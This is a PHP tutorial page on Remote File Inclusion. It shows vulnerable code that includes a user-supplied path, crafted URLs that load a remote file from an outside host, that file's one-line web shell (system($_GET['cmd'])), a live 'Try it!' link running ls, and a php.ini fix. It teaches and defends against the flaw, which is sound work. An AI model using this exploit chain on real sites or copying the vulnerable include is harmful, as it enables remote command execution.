<?php
	require('includes/functions.php');
	echo getHeader('Remote File Inclusion');
?>

    <!-- Main jumbotron for a primary marketing message or call to action -->
    <div class="jumbotron">
        <div class="container">
            <h1>Remote File Inclusion</h1>
			<a class="btn btn-primary btn-lg" href="/">
				<span class="glyphicon glyphicon-chevron-left"></span>
				Back To Home
			</a>
        </div>
    </div>

    <div class="container">
        <!-- Example row of columns -->
        <div class="row">
            <div class="col-md-12">
				
				<h2>Exploiting dynamic file include mechanisms in a web application</h2>
				<span>This tutorial will be used to successfully include a remote PHP script in a vulnerable PHP website</span>
				<br><br><br>
				<span>See the example page: <a href="/remote-file-inclusion/example" target="_blank">Example</a></span>
				<br><br>
				<h4>PHP</h4>
				<pre>
					<code class="php">
&lt;?php

    $dir = $_GET['module_name'];
    include ($dir . '/rfi_function.php');

?&gt;
					</code>
				</pre>
                <small>Source: <a href="http://cwe.mitre.org/data/definitions/98.html">http://cwe.mitre.org/data/definitions/98.html</a></small>
                
                <br><br>
				
				<h4>Specially Crafted URL : Part 1</h4>
				<pre>
					<code class="php">
						<?php echo htmlentities('
vulnerableFile.php?module_name=http://websec.michael-cunningham.ca/includes
						'); ?>
					</code>
				</pre>
                
                <br><br>
                
				<h4>Contents of Remote File: rfi_exploit.php</h4>
				<pre>
					<code class="php">
system($_GET['cmd']);
					</code>
				</pre>
                
                <br><br>
                
				<h4>Specially Crafted URL : Part 2</h4>
                <a href="/remote-file-inclusion/example?module_name=http://websec.michael-cunningham.ca/includes&cmd=/bin/ls%20-l" target="_blank">Try it!</a>
				<pre>
					<code class="php">
						<?php echo htmlentities('
vulnerableFile.php?module_name=http://websec.michael-cunningham.ca/includes&cmd=/bin/ls%20-l
						'); ?>
					</code>
				</pre>
				
                By including a remote malicious file into the local PHP script, we have successfully listed all files in the current working directory of the script. This information could be devastating if exposed to a user with malicious intent.
				
                <br><br>
                
				<h3>Solution</h3>
				
				To protect our web applications from remote file inclusion, simply turning off <code>allow_url_fopen</code> in <code>php.ini</code> will render any attempt to include a remote file useless. This will however break any intended functionality of the web application if it uses this method. It is highly recommended that this method is not used.
				
				<pre>
					<code class="php">
allow_url_fopen=Off
					</code>
				</pre>
				
			</div>
		</div>

<?php
	echo getFooter();
?>